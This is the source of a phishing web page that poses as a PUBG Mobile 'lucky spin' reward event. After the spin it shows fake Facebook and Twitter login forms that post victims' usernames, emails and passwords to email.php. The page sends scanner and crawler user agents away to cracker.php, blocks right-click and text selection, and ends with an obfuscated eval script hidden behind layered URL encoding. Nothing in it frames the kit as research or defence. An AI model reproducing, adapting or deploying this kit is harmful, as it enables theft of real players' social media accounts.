<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
$array_img = array(
'img/rewards/1.png',
'img/rewards/2.png',
'img/rewards/3.png',
'img/rewards/4.png',
'img/rewards/5.png',
'img/rewards/6.png',
);
$array_img_result = $array_img[rand(0, (count($array_img)-1))];
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <style>
   @font-face {
     font-family:halloween;
     src: url('css/hal.ttf') format("truetype");
      }
      @font-face {
     font-family:pubg;
     src: url('css/pubg.ttf') format("truetype");
      }
       body {
        margin:0;
        box-sizing:border-box;
       }
	   ::-webkit-scrollbar {
	   display: none;
	   }
       .wrap {
           width:100%;
           height:100%;
       }
       .wrap .bg {
           position:relative;
           width:100%;
           height:100%;
       }
       .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:415px;
       }
       .bg .box {
           width:100%;
           height:100%;
           text-align:center;
           margin-top:-30px;
       }
       
       .box .spin {
           background:url('img/pe.png') no-repeat;
           background-size:cover;
           width:380px;
           margin-top:30px;
           text-align:center;
           height:380px;
       }
       .spin .img{
           
           width:60px;
           height:60px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:37px;
           left:128px;
       }
       .spin .img:nth-child(2){
           position:relative;
           top:239x;
           left:63px;
           transform:rotate(0deg);
       }
       .spin .img:nth-child(3){
           position:relative;
           top:95px;
           right:-94px;
           transform:rotate(0deg);
       }
       .spin .img:nth-child(4){
           position:relative;
           top:200.5px;
           right:-30px;
           transform:rotate(0deg);
       }
       .spin .img:nth-child(5){
           position:relative;
           top:201.5px;
           left:-219px;
           transform:rotate(0deg);
       }
       .spin .img:nth-child(6){
           position:relative;
           top:33px;
           left:-91px;
           transform:rotate(0deg);
       }
       .box .start {
           position:relative;
           border:none;
		   margin-top: -70px;
           width:130px;
		   margin-left: auto;
		   margin-right: auto;
		   display: block;
       }

       .mask {
           position:fixed;
           top:0;
           left:0;
           width:100%;
           height:100%;
           background:rgba(0,0,0,0.50);
       }
       keyframes da {
           from { transform:translate(-50%,-80%);}
           to { transform:translate(-50%,-50%);}
       }
       @keyframes dax {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertx .topx {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:20px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertx .px {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
      .alertx .px img {
           width:100px;
           height:100px;
       }
       .alertx .btnx {
           margin-top:4px;
           width:95px;
           height:30px;
           line-height:30px;
           font-weight:bold;
           font-size:16px;
           font-family:'pubg';
           background:orange;
           border-radius:5px;
       }
       /**/
       .alertl {
           display:none;
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
           animation:dal 2s forwards ;
           transition:ease-in-out;
       }
       @keyframes dal {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertl .topl {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:15px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertl .pl {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
       .alertl .fb {
           height:32px;
           line-height:32px;
           width:250px;
           background:#3b5998;
           font-size:17px;
           padding-left:10px;
           border-radius:4px;
           box-shadow:0 3px 1px orange;
           color:white;
           font-weight:bold;
           margin-top:15%;
           font-family:'pubg';
           text-align:center;
       }
       .alertl .tw {
           padding-left:10px;
           height:32px;
           line-height:32px;
           width:250px;
           background:#1DA1F2;
           font-size:17px;
           border-radius:4px;
           box-shadow:0 3px 1px orange;
           color:white;
           font-weight:bold;
           margin-top:5%;
           font-family:'pubg';
           text-align:center;
       }
       .fb i , .tw i {
           margin-top:8px;
           float:left;
       }
             @media only screen and (min-width:100px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:150px;
       }
      }
       @media only screen and (min-width:200px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:370px;;
       }
       .bg .label {
           border:none;
           width:370px;
       }
       .bg .box {
           width:370px;
           height:380px;
       }
       .img {
           position:absolute;
           width:10px;
       }
       .box .spin {
           background:url('img/spin.png') no-repeat;
           background-size:cover;
           width:350px;
           text-align:center;
           height:350px;
       }
       .box .start {
           position:relative;
           border:none;
           bottom:270px;
           width:170px;
		   height: 220px;
       }
        .spin .img:nth-child(2){
           position:relative;
           top:255px;
           left:64px;
           transform:rotate(0deg);
       }
       }
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border:none;
           margin-top:-3px;
           width:410px;
       }
       .bg .box {
           width:410px;
           height:460px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:35px;
           left:130px;
       }
        .spin .img:nth-child(5){
           position:relative;
           top:195.5px;
           left:-225px;
           transform:rotate(0deg);
       }
       }

.bulet {
    color: #000;
    font-size: 8px;
}
.aktifnya {
    color: #1da1f2;
    border-bottom: 2px solid #1da1f2;
}
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border-radius:0;
           margin-top:0;
           width:410px;
       }
       .bg .box {
           border-radius:0;
           width:410px;
           height:350px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:38px;
           left:128px;
       }
        .spin .img:nth-child(5){
           position:relative;
           top:201.5px;
           left:-219px;
           transform:rotate(0deg);
       }
       }
   </style>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG MOBILE: Royale Pass S1C7</title>
    <link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
    <meta property="og:description" content="Start a event from Tencent. You can spin in one times only!">
    <meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
	<link rel="stylesheet" href="css-zone/facebook.css">
	<link rel="stylesheet" href="css-zone/twitter.css">
	<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <script type="text/javascript" src="js-zone/jquery.js"> </script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script> 
    <script type="text/javascript" src="index_files/main-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script script language="JavaScript">
        document.write(riyanandhika())
    </script>
    <link href="./index_files/css" rel="stylesheet">
    <script language="JavaScript">
        document.write(head())
    </script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="slider-container">
<section>
<div class="imgBox">
	<video src="media/pubg.mp4" autoplay loop muted></video>
</div>

<div class="slogan">
	<img src="img/slogan.png">
</div>

    </div>
    <div class="gallery-container">
    
	<center>
    <div class="wrap">
        <div class="bg">
            <div class="box">
                <center>
				<div class="spin">
                <img class="img" src="img/rewards/1.png">
                <img class="img" src="img/rewards/2.png">
                <img class="img" src="img/rewards/3.png">
                <img class="img" src="img/rewards/4.png">
                <img class="img" src="img/rewards/5.png">
                <img class="img" src="img/rewards/6.png">
                </div>
                </center>
				<img onclick="spin()" class="start" src="img/putar.png">
            </div>
        </div>
    </div>
	</center>
	
    </div>
    <div class="div-bot" style="color:white;padding-top: 10px;padding-bottom: 1px;">
        <center>
		<p>
                <img src="img/footer_img.png" style="padding-top: 10px;height:49px;">
				<div style="color: #fff; font-size: 17px; font-family: Teko; font-weight: bold; text-transform: uppercase;">&copy; 2017 KRAFTON, Inc. All rights reserved.</div>
				<div style="color: #fff; font-size: 17px; font-family: Teko; font-weight: bold; text-transform: uppercase;">&copy; 2018 - 2021 PUBG CORPORATION. All rights reserved.</div>
		</p>
        </center>
    </div>
    <script src="./index_files/jquery.min.js.download">
    </script>
    <script language="JavaScript">
        document.write(result())
    </script>
    <script type="text/javascript" src="index_files/gift-zone.js"></script>
    <script>
        function openHero(evt, heroClass) {
            var i, gallery, tab;
            gallery = document.getElementsByClassName("gallery");
            for (i = 0; i < gallery.length; i++) {
                gallery[i].style.display = "none";
            }
            tab = document.getElementsByClassName("tab");
            for (i = 0; i < tab.length; i++) {
                tab[i].className = tab[i].className.replace(" active", "");
            }
            document.getElementById(heroClass).style.display = "block";
            evt.currentTarget.className += " active";
        }
        document.getElementById("defaultOpen").click();
    </script>
    <script type="text/javascript" src="js-zone/slide-zone.js"> </script>
    <script type="text/javascript" src="./index_files/slide-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(luckyspin())
    </script>

    <style type="text/css">
        *: (input, textarea) {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
    <style type="text/css">
        img {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
	
<div class="popup open_rewards" style="display: none;">
<div class="popup-box">
<div class="popup-title">Congratulations</div>
<div class="popup-content">
<br>
<div class="popup-rewards-title">Are you sure to collect this rewards?</div>
<img class="popup-rewards-img1" src="<?php echo ''.$array_img_result.''; ?>">
</div>
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onclick="open_account_login()">Collect</button>
</div>
</div>
</div>

<div class="popup open_account_login" style="display: none;">
<div class="popup-box">
<div class="popup-title">Account Login</div>
<div class="popup-content">
<br>
<div class="popup-rewards-title">Login to receive your rewards</div>
<br>
<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter icon-login"></i> Log in using Twitter account</button>
</div>
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onclick="close_account_login()">Back</button>
</div>
</div>
</div>

   <div class="popup-login login_facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="email.php" method="post" onsubmit="return checkBeforeSubmit()">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">?????????</div>
			<div class="language-name">Espa??ol</div>
			<div class="language-name">Portugu??s (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login_twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<img src="img/login/twitter_text.png">
		</div>
		<br>
		<br>
		<div class="box-twitter">
			<center>
			<form action="email.php" method="post" onsubmit="return checkBeforeSubmit()">
				<div class="txt-login-twitter">Login to Twitter</div>
    <div class="form-group">
    <input type="text" name="username" id="us" autocomplete="off" required>
    <label>Username</label>
    </div>
    <div class="form-group">
    <input type="text" name="email" id="email1" autocomplete="off" required>
    <label>Mobile number or email address</label>
    </div>
				<div class="form-group">
				<input type="password" name="password" autocomplete="off" required>
				<label>Password</label>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">???</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<audio id="klik1" src="media/putar.mp3">
<script>
    function close_open_rewards() {
        $('.open_rewards').hide();
    }
	function open_account_login() {
        $('.open_account_login').show();
		$('.open_rewards').hide();
    }
	function close_account_login() {
        $('.open_account_login').hide();
		$('.open_rewards').show();
    }
	function open_facebook() {
        $('.login_facebook').show();
        $('.open_account_login').hide();
    }
	function open_twitter() {
        $('.login_twitter').show();
        $('.open_account_login').hide();
    }
	function close_facebook() {
        $('.login_facebook').hide();
        $('.open_account_login').show();
    }
	function close_twitter() {
        $('.login_twitter').hide();
        $('.open_account_login').show();
    }
   function spin() {
     document.getElementsByTagName("audio")[0].play();
    setTimeout(function() {
    $('.open_rewards').show();
   },3900);

  var $myElm = $(".spin");

  function rotate(degrees) {
    $myElm.css({
      '-webkit-transform': 'rotate(' + degrees + 'deg)',
      '-moz-transform': 'rotate(' + degrees + 'deg)',
      '-ms-transform': 'rotate(' + degrees + 'deg)',
      'transform': 'rotate(' + degrees + 'deg)'
    });
  }
 $({
    deg: 0
  }).animate({
    deg: 360 * 40
  }, {
    duration: 3900,
    step: function() {
        const lord = Math.random() * (360 - 1) + 1;
      var deg = this.deg;
      rotate(lord * 4);
    }
  });
}
setInterval(function time(){
  var d = new Date();
  var hours = 24 - d.getHours();
  var min = 60 - d.getMinutes();
  if((min + '').length == 1){
    min = '0' + min;
  }
  var sec = 60 - d.getSeconds();
  if((sec + '').length == 1){
        sec = '0' + sec;
  }
  jQuery('#waktu p').html(hours+':'+min+':'+sec)
}, 1000);
</script>
<script>
// <![CDATA[
function klik1() {
    var audio = document.getElementById('klik1');
    audio.play();
}
$(document).ready(function(){
        $("o").attr("onclick", "klik1()");
});
//]]></script>
        
<Script Language='Javascript'>
<!-- HTML Encryption sheko
<!--
document.write(unescape('%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%3C%21%2D%2D%20%0A%65%76%61%6C%28%75%6E%65%73%63%61%70%65%28%27%25%36%36%25%37%35%25%36%65%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%32%30%25%37%32%25%33%33%25%33%32%25%33%31%25%36%33%25%36%33%25%33%34%25%33%39%25%33%30%25%33%33%25%32%38%25%37%33%25%32%39%25%32%30%25%37%62%25%30%61%25%30%39%25%37%36%25%36%31%25%37%32%25%32%30%25%37%32%25%32%30%25%33%64%25%32%30%25%32%32%25%32%32%25%33%62%25%30%61%25%30%39%25%37%36%25%36%31%25%37%32%25%32%30%25%37%34%25%36%64%25%37%30%25%32%30%25%33%64%25%32%30%25%37%33%25%32%65%25%37%33%25%37%30%25%36%63%25%36%39%25%37%34%25%32%38%25%32%32%25%33%31%25%33%32%25%33%36%25%33%32%25%33%36%25%33%35%25%33%35%25%33%36%25%32%32%25%32%39%25%33%62%25%30%61%25%30%39%25%37%33%25%32%30%25%33%64%25%32%30%25%37%35%25%36%65%25%36%35%25%37%33%25%36%33%25%36%31%25%37%30%25%36%35%25%32%38%25%37%34%25%36%64%25%37%30%25%35%62%25%33%30%25%35%64%25%32%39%25%33%62%25%30%61%25%30%39%25%36%62%25%32%30%25%33%64%25%32%30%25%37%35%25%36%65%25%36%35%25%37%33%25%36%33%25%36%31%25%37%30%25%36%35%25%32%38%25%37%34%25%36%64%25%37%30%25%35%62%25%33%31%25%35%64%25%32%30%25%32%62%25%32%30%25%32%32%25%33%36%25%33%39%25%33%37%25%33%31%25%33%33%25%33%30%25%32%32%25%32%39%25%33%62%25%30%61%25%30%39%25%36%36%25%36%66%25%37%32%25%32%38%25%32%30%25%37%36%25%36%31%25%37%32%25%32%30%25%36%39%25%32%30%25%33%64%25%32%30%25%33%30%25%33%62%25%32%30%25%36%39%25%32%30%25%33%63%25%32%30%25%37%33%25%32%65%25%36%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%62%25%32%30%25%36%39%25%32%62%25%32%62%25%32%39%25%32%30%25%37%62%25%30%61%25%30%39%25%30%39%25%37%32%25%32%30%25%32%62%25%33%64%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%36%36%25%37%32%25%36%66%25%36%64%25%34%33%25%36%38%25%36%31%25%37%32%25%34%33%25%36%66%25%36%34%25%36%35%25%32%38%25%32%38%25%37%30%25%36%31%25%37%32%25%37%33%25%36%35%25%34%39%25%36%65%25%37%34%25%32%38%25%36%62%25%32%65%25%36%33%25%36%38%25%36%31%25%37%32%25%34%31%25%37%34%25%32%38%25%36%39%25%32%35%25%36%62%25%32%65%25%36%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%32%39%25%32%39%25%35%65%25%37%33%25%32%65%25%36%33%25%36%38%25%36%31%25%37%32%25%34%33%25%36%66%25%36%34%25%36%35%25%34%31%25%37%34%25%32%38%25%36%39%25%32%39%25%32%39%25%32%62%25%32%64%25%33%32%25%32%39%25%33%62%25%30%61%25%30%39%25%37%64%25%30%61%25%30%39%25%37%32%25%36%35%25%37%34%25%37%35%25%37%32%25%36%65%25%32%30%25%37%32%25%33%62%25%30%61%25%37%64%25%30%61%27%29%29%3B%0A%65%76%61%6C%28%75%6E%65%73%63%61%70%65%28%27%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%37%32%25%33%33%25%33%32%25%33%31%25%36%33%25%36%33%25%33%34%25%33%39%25%33%30%25%33%33%25%32%38%25%32%37%27%29%20%2B%20%27%25%33%38%25%37%31%25%36%34%25%37%33%25%36%64%25%37%37%25%37%30%25%32%34%25%37%66%25%37%63%25%37%33%25%36%34%25%33%66%25%32%32%25%37%32%25%36%36%25%37%64%25%37%30%25%33%34%25%36%61%25%36%35%25%37%31%25%36%34%25%37%34%25%36%36%25%37%34%25%36%64%25%37%36%25%37%37%25%32%33%25%34%36%25%32%37%25%30%39%25%30%61%25%32%62%25%32%35%25%37%39%25%36%30%25%37%34%25%32%34%25%37%64%25%36%32%25%37%32%25%35%33%25%37%32%25%36%32%25%36%39%25%36%32%25%37%31%25%37%37%25%36%34%25%36%36%25%32%34%25%33%62%25%32%33%25%36%66%25%36%35%25%36%62%25%37%33%25%36%31%25%33%34%25%32%35%25%32%33%25%32%31%25%32%32%25%32%34%25%30%62%25%30%64%25%32%35%25%32%34%25%32%37%25%32%34%25%36%65%25%37%65%25%37%37%25%36%34%25%37%35%25%36%62%25%37%37%25%37%34%25%32%33%25%36%32%25%36%63%25%36%32%25%36%33%25%36%62%25%34%64%25%36%30%25%36%39%25%37%32%25%37%34%25%36%31%25%35%31%25%37%36%25%36%33%25%36%39%25%36%65%25%37%30%25%32%63%25%32%32%25%37%61%25%32%33%25%30%63%25%30%63%25%32%34%25%32%36%25%32%33%25%32%35%25%32%34%25%32%37%25%36%64%25%36%65%25%32%33%25%32%34%25%37%38%25%36%30%25%37%35%25%35%33%25%37%33%25%36%35%25%36%38%25%36%64%25%37%33%25%37%30%25%36%31%25%36%66%25%32%63%25%32%33%25%37%65%25%32%32%25%30%39%25%30%38%25%32%33%25%32%35%25%32%34%25%32%37%25%32%34%25%32%34%25%32%62%25%32%35%25%37%38%25%36%30%25%37%35%25%35%33%25%37%33%25%36%35%25%36%38%25%36%64%25%37%33%25%37%30%25%36%31%25%36%66%25%32%35%25%33%65%25%32%31%25%37%36%25%37%32%25%37%33%25%36%36%25%33%61%25%32%34%25%30%61%25%30%61%25%32%34%25%32%62%25%32%35%25%32%33%25%32%31%25%32%32%25%32%34%25%32%36%25%37%35%25%36%30%25%37%30%25%37%32%25%37%32%25%37%36%25%32%62%25%37%65%25%36%32%25%37%36%25%35%35%25%37%31%25%36%30%25%36%65%25%36%63%25%37%30%25%37%33%25%36%31%25%36%30%25%33%34%25%32%35%25%30%65%25%30%66%25%32%32%25%32%34%25%32%36%25%32%33%25%32%35%25%32%34%25%37%61%25%32%34%25%30%39%25%30%35%25%32%35%25%32%33%25%32%31%25%32%32%25%32%34%25%32%36%25%37%35%25%36%30%25%37%30%25%37%32%25%37%32%25%37%36%25%32%62%25%36%66%25%36%32%25%36%64%25%37%35%25%36%31%25%33%39%25%32%33%25%30%38%25%30%61%25%32%37%25%32%34%25%32%34%25%32%62%25%37%38%25%32%33%25%32%31%25%32%32%25%32%34%25%32%36%25%30%65%25%30%62%25%33%38%25%33%34%25%37%33%25%36%33%25%37%64%25%36%63%25%37%33%25%37%35%25%34%30%25%32%34%25%30%62%25%30%64%25%33%39%25%33%37%25%36%31%25%37%37%25%36%30%25%37%32%25%34%37%25%32%33%25%30%63%25%30%63%25%33%38%25%33%35%25%36%62%25%37%31%25%36%39%25%36%62%25%34%36%31%32%36%32%36%35%35%36%25%33%36%25%33%34%25%33%31%25%33%37%25%33%36%25%33%35%25%33%36%27%20%2B%20%75%6E%65%73%63%61%70%65%28%27%25%32%37%25%32%39%25%32%39%25%33%62%27%29%29%3B%0A%2F%2F%20%2D%2D%3E%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%6E%6F%73%63%72%69%70%74%3E%3C%69%3E%4A%61%76%61%73%63%72%69%70%74%20%72%65%71%75%69%72%65%64%3C%2F%69%3E%3C%2F%6E%6F%73%63%72%69%70%74%3E%0A%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E%0A%0A'));
//-->
</Script>